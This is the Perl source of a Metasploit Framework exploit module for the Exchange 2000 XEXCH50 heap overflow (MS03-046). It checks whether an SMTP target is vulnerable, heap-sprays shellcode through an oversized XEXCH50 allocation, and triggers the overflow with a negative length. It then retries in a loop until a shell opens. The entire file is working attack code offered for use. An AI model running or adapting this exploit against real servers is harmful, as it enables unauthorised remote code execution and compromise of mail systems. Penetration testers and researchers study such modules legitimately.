package Msf::Exploit::exchange2000_xexch50;
use base "Msf::Exploit";
use strict;

my %info =
(
    'Name'  => 'Exchange 2000 MS03-46 Heap Overflow',
    'Version'  => '2.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The target port', 25],
                    'SSL'   => [0, 'BOOL', 'Use SSL'],
                },

    'Payload' => {
                 'Size'  => 1024,
                 'BadChars'  => "\x00\x0a\x0d\x20:=+\x22",
               },
    
    'Description'  => 'This is an exploit for the Exchange 2000 heap overflow. Due to the nature of the '.
                      'vulnerability, this exploit is not very reliable. This module has been tested against '.
                      'Exchange 2000 SP0 and SP3 running a Windows 2000 system patched to SP4. It normally takes '.
                      'between one and ten tries to successfully obtain a shell.',
                
    'Refs'  =>  [  
                    'http://www.microsoft.com/technet/security/bulletin/MS03-046.asp'
                ],
    'Targets' => [
                   ['Exchange 2000', 0x0c900c90, 11000, 20000, 1000],
                 ],
);

sub new {
    my $class = shift;
    my $obj = $class->SUPER::new({'Info' => \%info}, @_);
    return $obj;
}

sub Check {
    my ($obj, $opt) = @_;  
    
    my $s = Pex::Socket->new( {"SSL" => $opt->{"SSL"}} );
    if (! $s->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
    {
        return "Error: " . $s->get_error() . "\n";
    }
    
    my $res = $s->recv(45);
    if ($res !~ /Microsoft/)
    {
        $s->close();
        return("Target is not an Exchange server");
    }
    
    $s->send("EHLO X\r\n");
    $res = $s->recv(10);
    if ($res !~ /XEXCH50/)
    {
        return("Target is not running Exchange");
    }
    
    $s->send("MAIL FROM: metasploit\r\n");
    $res = $s->recv(10);
    
    $s->send("RCPT TO: administrator\r\n");  
    $res = $s->recv(10);
    
    $s->send("XEXCH50 2 2\r\n");
    $res = $s->recv(10);
    $s->close();
    
    if ($res !~ /Send binary/)
    {
        return("Target is not vulnerable");
    }
    
    return("Target is vulnerable");
}


sub Exploit {
    my ($obj, $opt) = @_;
    select(STDOUT);$|++;  
    
    if (! $opt->{"RPORT"}) { $opt->{"RPORT"} = 25 }


    my $target = defined($obj->{'Info'}->{'Targets'}->[$opt->{'TARGET'}]) ? 
                 $obj->{'Info'}->{'Targets'}->[$opt->{'TARGET'}] : 
                 $obj->{'Info'}->{'Targets'}->[0];
                 
    my ($tname, $retaddr) = @{$target};
    my $buff_len = $target->[2];

    printf("[*] Trying '$tname' using return address 0x%.8x [$buff_len]\n", $retaddr);

    my $counter = 1;
    my @seencount = ();
    
    while (1)
    {
        if(! $seencount[$counter])
        {
            print "[*] Exploit attempt #$counter\n";
            $seencount[$counter]++;
        }
        
        print "[*] Connection 1: ";
        my $s = Pex::Socket->new( {"SSL" => $opt->{"SSL"}} );
        if (! $s->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
        {
            print "Error\n";
            sleep(5);
            next;
        }

        my $res = $s->recv(10);
        if (! $res)
        {
            print "Error\n";
            next;
        }

        if ($res !~ /Microsoft/)
        {
            $s->close();
            print "Error\n[*] Target does not appear to be running Exchange: $res\n";
            exit(0);
        }

        print "EHLO ";
        $s->send("EHLO X\r\n");
        $res = $s->recv(10);
        if (! $res) { print "Error\n"; next; }

        if ($res !~ /XEXCH50/)
        {
            print "Error\nTarget is not running Exchange: $res\n";
            exit(0);
        }

        print "MAIL ";
        $s->send("MAIL FROM: metasploit\r\n");
        $res = $s->recv(10);
        if (! $res) { print "Error\n"; next; }

        print "RCPT ";
        $s->send("RCPT TO: administrator\r\n");  
        $res = $s->recv(10);
        if (! $res) { print "Error\n"; next; }

        # verify that the server is not patched
        $s->send("XEXCH50 2 2\r\n");
        $res = $s->recv(10);
        if (! $res) { print "Error\n"; next; }

        print "XEXCH50 ";
        if ($res !~ /Send binary/)
        {
            $s->close();
            print "[*] Error\nTarget is not vulnerable.\n";
            exit(0);
        }

        $s->send("XX");
        $res = $s->recv(10);
        if (! $res) { print "Error\n"; next; }

        print "ALLOC ";
        # allocate heap memory
        my $dsize = (1024 * 1024 * 32);
        $s->send("XEXCH50 $dsize 2\r\n");
        $res = $s->recv(10);
        print "OK\n";

        my $payload =  (pack("L", $retaddr) x (256 * 1024) . $opt->{'SHELLCODE'} . ("X" x 1024)) x 4;

        print "[*] Uploading shellcode to remote heap: ";
        $s->send($payload);
        print "OK\n";

        print "[*] Connection 2: ";
        my $x = Pex::Socket->new( {"SSL" => $opt->{"SSL"}} );
        if (! $x->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
        {
            print "Error\n";
            next;
        }
        $res = $x->recv(10);
        if (! $res) { print "Error\n[*] Response\n"; next; }

        print "EHLO ";
        $x->send("EHLO X\r\n");
        $res = $x->recv(10);
        if (! $res) { print "Error\n"; next; }

        if ($res !~ /XEXCH50/)
        {
            print "Error\nTarget is not running Exchange: $res\n";
            exit(0);
        }

        print "MAIL ";
        $x->send("MAIL FROM: metasploit\r\n");
        $res = $x->recv(10);
        if (! $res) { print "Error\n"; next; }

        print "RCPT ";
        $x->send("RCPT TO: administrator\r\n");  
        $res = $x->recv(10);
        if (! $res) { print "Error\n"; next; }

        print "XEXCH50 ";
        # allocate a negative value
        $x->send("XEXCH50 -1 2\r\n");
        $res = $x->recv(10);
        if (! $res) { print "[*] No response\n"; next; }
        print "OK\n";
        
        $buff_len += $target->[4];
        if ($buff_len > $target->[3]) { $buff_len = $target->[2] }
        
        # send the massive buffer of our return address
        my $heapover = pack("L", $retaddr) x ($buff_len);
        
        print "[*] Overwriting heap with payload jump ($buff_len)...\n";
        $x->send($heapover);

        # reconnect until the service stops responding
        my $count = 0;
        print "[*] Starting reconnect sequences: ";
        my $tmp = Pex::Socket->new( {"SSL" => $opt->{"SSL"}} );
        while ($count < 10 && $tmp->tcp($opt->{"RHOST"}, $opt->{"RPORT"}))
        {
            $tmp->send("HELO X\r\n");
            $tmp->close();
            $count++;
        }
        print " OK\n\n";
        $counter++;
    }
    exit(0);
}

1;
